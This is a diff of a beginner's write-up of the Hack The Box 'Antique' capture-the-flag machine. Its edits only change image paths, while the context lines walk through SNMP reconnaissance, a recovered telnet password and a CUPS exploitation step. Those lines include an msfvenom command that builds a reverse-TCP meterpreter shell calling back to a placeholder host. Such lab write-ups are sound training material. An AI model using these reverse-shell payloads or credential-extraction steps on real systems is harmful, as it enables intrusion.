@@ -8,7 +8,7 @@ I am a beginner at penetration testing, so I will be referencing the Official Ha
 
 From the tags, I am able to notice that this machine is about printer exploitation on Linux:
 
-![](<../../.gitbook/assets/image (341) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (341) (1) (1) (1) (1) (1).png>)
 
 A basic nmap scan shows that only telnet is online:
 
@@ -70,7 +70,7 @@ Nmap done: 1 IP address (1 host up) scanned in 626.36 seconds
 
 This nmap scan came back with pretty much the same information. I then viewed the walk-through to see where I had messed up. I learned about a tool called **snmpwalk**. In the walk-through, the author runs `snmpwalk -v 2c -c public 10.10.11.107`, which gets the following output:
 
-![](<../../.gitbook/assets/image (332) (1) (1).png>)
+![](<../../.gitbook/assets/image (332) (1) (1) (1).png>)
 
 I had actually had found the password for telnet on my own, but I was unable to decode it:
 
@@ -78,7 +78,7 @@ I had actually had found the password for telnet on my own, but I was unable to 
 
 I use **snmpget**, while the walk-through used **snmpwalk**. In the walk-through they used **binascii** (python import) in order to decode the bytes. I wanted to find a solution that was a bit more basic. I ended up using [https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html) to convert the bytes from hex to ascii:
 
-![](<../../.gitbook/assets/image (346) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (346) (1) (1) (1) (1).png>)
 
 The password seems to be: **P@ssw0rd@123!!123** I was in!
 
@@ -108,7 +108,7 @@ They then go on to say that we should use **chisel** to connect to the port. I r
 
 When we search for cups on metasploit we get the following:
 
-![](<../../.gitbook/assets/image (338) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (338) (1) (1) (1) (1).png>)
 
 We first make a shell file to upload to the server. To do this, the walk-through mentioned previously mentions `msfvenom -p linux/x64/meterpreter/reverse`_`tcp LHOST=<`_`YOUR-IP> LPORT=1337 --format elf > shell`. This will make the **shell** file in your directory. To move it to the remote machine, you can use the python http.server command mentioned previously. Before I ran the shell executable, I ran the following commands in Metasploit (based off of [this write-up](https://howtohack44323049.wordpress.com/2021/12/13/htb\_antique\_eng/)):
 
